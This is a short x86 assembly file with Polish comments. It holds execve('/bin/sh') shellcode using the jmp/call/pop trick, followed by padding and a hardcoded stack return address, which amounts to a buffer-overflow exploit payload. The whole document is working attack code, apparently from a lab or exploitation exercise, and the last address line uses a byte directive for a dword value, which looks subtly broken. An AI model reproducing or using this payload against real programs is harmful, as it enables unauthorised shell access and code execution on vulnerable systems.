BITS 32
jmp short callit					; jmp trik aby otrzymać absolutny
									; adres stringa '/bin/sh'
doit:
pop			esi						; ściągamy ze stosu adres string
xor			eax, eax				; eax = 0
mov byte	[esi + 7], al			; zaro na koniec /bin/sh
lea			ebx, [esi]				; adres /bin/sh do ebx
mov dword	[esi + 8], ebx			; AAAA ([esi + 8]) = ebx
mov dword	[esi + 12], eax			; BBBB ([esi + 12]) = NULL
mov byte	al, 0x0b				; syscall 0x0b, czyli execve
mov			ebx, esi				; argument 1 - /bin/sh
lea			ecx, [esi + 8]			; argument 2 - wskaźnik do /bin/sh
lea			edx, [esi + 12]			; argument 3 - NULL
int			0x80
callit		
call		doit					; trik aby otrzymać na stosie
									; absolutny adres stringa
			db '/bin/sh#AAAABBBB'
times 33	db 0xff
			db 0xffffd3b0
			db 0x00